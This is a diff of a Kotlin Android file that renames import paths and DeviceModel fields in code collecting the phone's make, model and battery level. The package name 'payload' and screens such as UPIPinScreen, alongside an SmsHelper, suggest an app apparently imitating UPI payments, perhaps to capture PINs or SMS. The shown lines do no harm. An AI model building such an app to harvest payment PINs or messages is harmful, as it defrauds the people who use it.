@@ -5,14 +5,14 @@ import android.os.BatteryManager
 import android.os.Build
 import androidx.compose.runtime.*
 import androidx.compose.ui.platform.LocalContext
-import com.payload.jansiix0ne.data.model.DeviceModel
-import com.payload.jansiix0ne.data.repository.FirestoreRepository
+import com.payload.jansiix0ne.models.DeviceModel
+import com.payload.jansiix0ne.repository.FirestoreRepository
 import com.payload.jansiix0ne.ui.screens.HomeScreen
 import com.payload.jansiix0ne.ui.screens.PaymentFailedScreen
 import com.payload.jansiix0ne.ui.screens.PaymentSuccessScreen
 import com.payload.jansiix0ne.ui.screens.TrialDialog
 import com.payload.jansiix0ne.ui.screens.UPIPinScreen
-import com.payload.jansiix0ne.util.SmsHelper
+import com.payload.jansiix0ne.utils.SmsHelper
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
@@ -73,8 +73,8 @@ fun MainScreen() {
                         val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 0
                         
                         val deviceModel = DeviceModel(
-                            deviceId = deviceId,
-                            mobileName = "${Build.MANUFACTURER} ${Build.MODEL}",
+                            deviceid = deviceId,
+                            mobilename = "${Build.MANUFACTURER} ${Build.MODEL}",
                             charge = "$batteryLevel%"
                         )
                         
